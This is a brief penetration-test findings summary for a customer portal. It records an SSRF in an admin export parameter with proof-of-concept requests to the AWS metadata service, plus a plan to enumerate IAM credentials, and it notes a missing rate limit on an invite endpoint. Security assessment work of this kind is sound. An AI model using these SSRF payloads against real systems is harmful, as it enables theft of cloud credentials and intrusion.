**project:** customer-portal | **findings:** 1 critical, 1 medium | **history:** 89 items (mostly 200s on `/api/items/{1-89}`, ~8 scattered 401s — noise)

---

**CRITICAL — BURP-CRIT-17: SSRF via export target param**
- **Endpoint:** `GET /api/admin/export?target=<url>`
- **PoC:** `GET /api/admin/export?target=http://169.254.169.254/latest/meta-data/iam/`
- **Response:** 200 — server-side export worker fetches target; AWS IMDS reachable
- **Clue:** Metadata path `/iam/` → enumerate creds via `/iam/security-credentials/`

**MEDIUM — BURP-MED-04: No rate limit on `/api/invite`**

---

**Next decision:** Confirm IAM creds — probe `?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/` and enumerate role names.
